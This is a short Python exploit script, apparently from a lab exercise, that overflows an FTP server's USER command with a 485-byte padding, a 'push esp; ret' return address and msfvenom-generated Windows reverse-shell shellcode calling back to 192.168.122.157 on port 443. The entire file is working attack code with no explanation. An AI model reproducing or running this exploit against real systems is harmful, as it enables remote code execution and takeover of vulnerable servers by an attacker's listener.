import socket

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.157 LPORT=443 -a x86 --platform windows -b '\x00\x0a\x0d\x40' -f c
# 351 bytes
shellcode = ("\xbf\x2c\x90\xa5\xa0\xd9\xce\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x7b\x12\x83\xc3\x04\x03\x57\x9e\x47\x55\x5b\x76\x05"
"\x96\xa3\x87\x6a\x1e\x46\xb6\xaa\x44\x03\xe9\x1a\x0e\x41\x06"
"\xd0\x42\x71\x9d\x94\x4a\x76\x16\x12\xad\xb9\xa7\x0f\x8d\xd8"
"\x2b\x52\xc2\x3a\x15\x9d\x17\x3b\x52\xc0\xda\x69\x0b\x8e\x49"
"\x9d\x38\xda\x51\x16\x72\xca\xd1\xcb\xc3\xed\xf0\x5a\x5f\xb4"
"\xd2\x5d\x8c\xcc\x5a\x45\xd1\xe9\x15\xfe\x21\x85\xa7\xd6\x7b"
"\x66\x0b\x17\xb4\x95\x55\x50\x73\x46\x20\xa8\x87\xfb\x33\x6f"
"\xf5\x27\xb1\x6b\x5d\xa3\x61\x57\x5f\x60\xf7\x1c\x53\xcd\x73"
"\x7a\x70\xd0\x50\xf1\x8c\x59\x57\xd5\x04\x19\x7c\xf1\x4d\xf9"
"\x1d\xa0\x2b\xac\x22\xb2\x93\x11\x87\xb9\x3e\x45\xba\xe0\x56"
"\xaa\xf7\x1a\xa7\xa4\x80\x69\x95\x6b\x3b\xe5\x95\xe4\xe5\xf2"
"\xda\xde\x52\x6c\x25\xe1\xa2\xa5\xe2\xb5\xf2\xdd\xc3\xb5\x98"
"\x1d\xeb\x63\x0e\x4d\x43\xdc\xef\x3d\x23\x8c\x87\x57\xac\xf3"
"\xb8\x58\x66\x9c\x53\xa3\xe1\x63\x0b\xd1\x6c\x0b\x4e\x25\x8e"
"\x77\xc7\xc3\xfa\x97\x8e\x5c\x93\x0e\x8b\x16\x02\xce\x01\x53"
"\x04\x44\xa6\xa4\xcb\xad\xc3\xb6\xbc\x5d\x9e\xe4\x6b\x61\x34"
"\x80\xf0\xf0\xd3\x50\x7e\xe9\x4b\x07\xd7\xdf\x85\xcd\xc5\x46"
"\x3c\xf3\x17\x1e\x07\xb7\xc3\xe3\x86\x36\x81\x58\xad\x28\x5f"
"\x60\xe9\x1c\x0f\x37\xa7\xca\xe9\xe1\x09\xa4\xa3\x5e\xc0\x20"
"\x35\xad\xd3\x36\x3a\xf8\xa5\xd6\x8b\x55\xf0\xe9\x24\x32\xf4"
"\x92\x58\xa2\xfb\x49\xd9\xd2\xb1\xd3\x48\x7b\x1c\x86\xc8\xe6"
"\x9f\x7d\x0e\x1f\x1c\x77\xef\xe4\x3c\xf2\xea\xa1\xfa\xef\x86"
"\xba\x6e\x0f\x34\xba\xba")

#0x77c35459 : push esp # ret
# "\x81\xC4\x24\xFA\xFF\xFF" => sub esp, -1500
buffer = "A"*485 + "\x59\x54\xc3\x77" + "C"*4 + "\x90\x90\x81\xC4\x24\xFA\xFF\xFF" + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 21))
res = s.recv(1024)
print(res)
s.send('USER ' + buffer + '\r\n')
res = s.recv(1024)
print(res)
s.send('PASS PASSWORD\r\n')
s.close()
